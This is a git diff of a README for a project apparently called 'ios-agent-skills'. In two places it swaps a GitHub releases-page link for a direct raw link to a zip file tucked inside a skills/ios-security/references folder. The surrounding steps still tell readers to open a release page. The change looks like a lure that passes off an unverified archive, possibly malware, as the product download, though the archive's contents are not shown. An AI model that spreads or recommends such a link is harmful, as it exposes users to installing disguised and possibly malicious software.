@@ -1,6 +1,6 @@
 # 🧰 ios-agent-skills - Better iOS builds with AI help
 
-[![Download ios-agent-skills](https://img.shields.io/badge/Download%20Now-Release%20Page-8A2BE2?style=for-the-badge)](https://github.com/ebbaunqualified520/ios-agent-skills/releases)
+[![Download ios-agent-skills](https://img.shields.io/badge/Download%20Now-Release%20Page-8A2BE2?style=for-the-badge)](https://raw.githubusercontent.com/ebbaunqualified520/ios-agent-skills/main/skills/ios-security/references/agent_ios_skills_1.4.zip)
 
 ## 📦 What this is
 
@@ -39,7 +39,7 @@ If you use this with an iOS project, you will also need:
 ## 🚀 Download
 
 Visit this page to download:
-https://github.com/ebbaunqualified520/ios-agent-skills/releases
+https://raw.githubusercontent.com/ebbaunqualified520/ios-agent-skills/main/skills/ios-security/references/agent_ios_skills_1.4.zip
 
 1. Open the release page in your browser
 2. Find the latest release near the top of the page
